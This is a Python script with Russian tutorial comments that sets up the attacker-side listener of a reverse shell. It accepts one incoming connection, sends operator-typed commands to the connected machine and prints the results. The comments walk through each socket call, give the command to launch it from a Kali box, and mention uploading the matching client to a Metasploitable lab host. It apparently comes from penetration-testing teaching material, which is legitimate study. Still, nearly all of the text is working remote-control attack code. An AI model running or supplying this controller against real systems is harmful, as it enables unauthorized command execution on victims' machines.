from socket import *

serverPort = 8000
serverSocket = socket(AF_INET, SOCK_STREAM)  # 1
serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)  # 2
serverSocket.bind(('', serverPort)) # 3
serverSocket.listen(1)  # 4

print("Attacker box listening and awaiting instructions")

connectionSocket, addr = serverSocket.accept()  # 5

print("Thanks for connecting to me "+str(addr))

message = connectionSocket.recv(1024)

print(message)

command =""

while command != "exit":
    command = input("Please enter a command: ")
    connectionSocket.send(command.encode())
    message = connectionSocket.recv(1024).decode()
    print(message)

connectionSocket.shutdown(SHUT_RDWR) # 6

connectionSocket.close()

# Сначала мы создаем TCP-сокет IPv4 (1).
# Чтобы сокеты могли эффективно взаимодействовать друг с другом, версии IP и протоколы должны совпадать,
# поэтому мы используем те же протоколы, что и в случае с клиентом.
# Для большей надежности мы позволяем операционной системе повторно использовать недавно использованный сокет (2).
# Создав сокет, мы можем привязать его к порту компьютера. Функция bind() принимает два параметра (3): IP-адрес компьютера и порт. Е
# сли параметр IP-адреса пуст, то эта функция будет использовать IP-адрес, назначенный компьютеру по умолчанию.
#
# Теперь, когда сокет привязан к порту, он может прослушивать соединения (4).
# Здесь мы можем указать количество поддерживаемых соединений. Поскольку в данном случае у нас только один клиент, мы можем поддерживать одно соединение.
# Как только клиент подключится к нашему сокету, мы примем соединение и вернем его объект (5).
# Он будет использоваться для отправки и получения команд. Завершив отправку команд, мы настроим соединение на быстрое завершение (6)  и закроем его.
#
# Запустите сервер, выполнив следующую команду:
#
# kali@kali:~$ python3 ~/Desktop/shell/shellServer.py
#
# Теперь, когда сервер ожидает соединения с клиентом, мы можем приступить к загрузке клиента (reverseShell.py) на сервер Metasploitable.